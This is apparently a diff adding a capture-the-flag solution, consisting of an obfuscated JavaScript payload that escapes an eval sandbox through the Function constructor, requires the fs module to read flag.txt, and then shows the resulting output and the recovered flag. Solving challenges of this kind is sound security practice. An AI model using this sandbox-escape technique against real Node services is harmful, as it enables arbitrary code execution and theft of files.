@@ -1,0 +1,17 @@
+([a="defineProperty",b="return process",c="flag.txt"],x="construc"+"tor",{[d=(f)=>Object[a](this,"z",{get:f})]:y="readFileSync",[e=(m)=>m[x](b)().mainModule.require("fs")[y](c)]:1,[d (function(){return e(arguments.callee.caller)})]:1})
+
+Result:
+{
+  '(f)=>Object[a](this,"z",{get:f})': 'readFileSync',
+  '(m)=>m[x](b)().mainModule.require("fs")[y](c)': 1,
+  '[object Object]': 1
+}
+Variables:
+a = defineProperty
+b = return process
+c = flag.txt
+x = constructor
+y = readFileSync
+z = <Buffer 61 63 74 66 7b 6d 61 79 62 65 5f 65 76 61 6c 5f 69 73 5f 6a 75 73 74 5f 61 5f 62 61 64 5f 69 64 65 61 7d 0a 67 67 0a 73 70 6c 69 74 6c 69 6e 65 0a>
+
+actf{maybe_eval_is_just_a_bad_idea}
